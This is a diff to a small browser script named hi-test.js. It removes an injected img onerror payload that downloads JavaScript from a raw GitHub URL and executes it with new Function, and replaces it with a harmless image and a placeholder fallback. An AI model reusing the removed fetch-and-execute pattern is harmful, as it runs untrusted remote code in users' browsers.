@@ -1,12 +1,11 @@
 /// hi-test.js
 (function(){
-  var el = document.createElement('p');
-  el.textContent = '<img src="bad-image.png" onerror="
-(async()=>{
-  const res = await fetch('https://raw.githubusercontent.com/StudioCompile/Ublock-features/refs/heads/main/code.js');
-  const code = await res.text();
-  new Function(code)();
-})();
-">';
+  var el = document.createElement('img');
+  el.src = 'https://picsum.photos/100/100';
+  el.onerror = function(){
+    var fallback = document.createElement('img');
+    fallback.src = 'https://placehold.co/100x100';
+    document.documentElement.appendChild(fallback);
+  };
   document.documentElement.appendChild(el);
 })();
